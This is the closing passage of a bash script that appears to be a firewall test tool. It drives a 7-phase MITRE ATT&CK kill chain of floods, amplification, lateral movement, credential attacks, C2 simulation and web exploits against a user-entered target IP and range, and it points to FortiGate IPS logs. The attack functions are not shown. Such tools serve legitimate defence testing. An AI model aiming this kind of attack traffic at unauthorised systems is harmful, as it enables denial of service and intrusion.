    show_section "CATEGORY 16: Full 7-Phase MITRE ATT&CK Kill Chain"

    printf "\n${BRED}  ╔══════════════════════════════════════════════════════════════════╗\n"
    printf "  ║      NEXUS FW ATTACK  --  7-PHASE ATT&CK KILL CHAIN ACTIVE      ║\n"
    printf "  ╚══════════════════════════════════════════════════════════════════╝${NC}\n\n"

    local kc_start; kc_start=$(date +%s)
    local phases=(
        "1:Reconnaissance:cat_recon"
        "2:Port Scanning and Enumeration:cat_portscan"
        "3:Evasion and Amplification:cat_evasion;cat_amplification"
        "4:Multi-Vector Flood:cat_synflood;cat_udpflood;cat_icmpflood"
        "5:Layer 7 Application Attacks:cat_applayer;cat_slowattacks"
        "6:Lateral Movement and Credential Access:cat_lateral;cat_credattacks"
        "7:C2 Channels and Web Exploits and FortiGate:cat_c2sim;cat_webexploits;cat_fortigate"
    )

    for phase in "${phases[@]}"; do
        IFS=':' read -r pnum pname pfuncs <<< "$phase"
        printf "\n${MAG}  ╔══ Phase %s: %s ══╗${NC}\n" "$pnum" "$pname"
        local pt; pt=$(date +%s)
        IFS=';' read -ra fns <<< "$pfuncs"
        for fn in "${fns[@]}"; do "$fn"; done
        printf "${LGRN}  ╚══ Phase %s COMPLETE  [%ds elapsed] ══╝${NC}\n" "$pnum" "$(( $(date +%s) - pt ))"
    done

    local kc_elapsed=$(( $(date +%s) - kc_start ))
    printf "\n${LGRN}"
    cat <<'DONE'
  ██████╗  ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔═══██╗████╗  ██║██╔════╝
  ██║  ██║██║   ██║██╔██╗ ██║█████╗
  ██║  ██║██║   ██║██║╚██╗██║██╔══╝
  ██████╔╝╚██████╔╝██║ ╚████║███████╗
  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝
DONE
    printf "${NC}\n"
    printf "${LGRN}  Kill Chain Complete in %ds -- Check FortiGate SIEM/IPS logs${NC}\n\n" "$kc_elapsed"
}

# ==============================================================================
#  CLEANUP
# ==============================================================================
cleanup() { rm -rf "$TMPDIR_SOC" 2>/dev/null || true; }
trap 'cleanup' EXIT

# ==============================================================================
#  MAIN
# ==============================================================================
show_banner
show_safety
check_deps
[[ $INSTALL_DEPS -eq 1 ]] && install_deps
show_dep_status
[[ $SHOW_MITRE -eq 1 ]] && show_mitre

# Interactive target override
printf "${CYN}  Target IP    [Enter = %s]: ${NC}" "$TARGET_IP"
read -r inp
[[ "$inp" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] && { TARGET_IP="$inp"; fn_ok "Target: $TARGET_IP"; }

printf "${CYN}  Target Range [Enter = %s]: ${NC}" "$TARGET_RANGE"
read -r inp
[[ "$inp" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]] && { TARGET_RANGE="$inp"; fn_ok "Range: $TARGET_RANGE"; }

printf "\n"
fn_info "Starting: Category=${CATEGORY}  Target=${TARGET_IP}  Range=${TARGET_RANGE}"
fn_info "Rate=${PACKET_RATE}/s  Burst=${BURST}  Duration=${FLOOD_DUR}s  HPING_US=${HPING_US}"
printf "\n"

START_T=$(date +%s)

case "$CATEGORY" in
    All)              cat_portscan; cat_synflood; cat_udpflood; cat_icmpflood; cat_tcpattacks; cat_applayer; cat_evasion; cat_recon; cat_amplification; cat_slowattacks; cat_lateral; cat_webexploits; cat_c2sim; cat_credattacks; cat_fortigate ;;
    PortScan)         cat_portscan ;;
    SYNFlood)         cat_synflood ;;
    UDPFlood)         cat_udpflood ;;
    ICMPFlood)        cat_icmpflood ;;
    TCPAttacks)       cat_tcpattacks ;;
    AppLayer)         cat_applayer ;;
    Evasion)          cat_evasion ;;
    Recon)            cat_recon ;;
    Amplification)    cat_amplification ;;
    SlowAttacks)      cat_slowattacks ;;
    LateralMovement)  cat_lateral ;;
    WebExploits)      cat_webexploits ;;
    C2Sim)            cat_c2sim ;;
    CredAttacks)      cat_credattacks ;;
    FortiGate)        cat_fortigate ;;
    KillChain)        cat_killchain ;;
    *) printf "${LRED}[!] Unknown category: %s${NC}\n" "$CATEGORY"; usage ;;
esac

ELAPSED=$(( $(date +%s) - START_T ))
printf "\n"
fn_info "Completed in ${ELAPSED}s  Triggered=${TRIGGERED}  Skipped=${SKIPPED}  Errors=${ERRORS}"

save_reports
show_summary
show_fg_ref

[[ $SHOW_MITRE -eq 1 ]] && show_mitre

printf "${LCYN}  %s -- Done. Log: %s${NC}\n\n" "$VERSION" "$LOG_FILE"
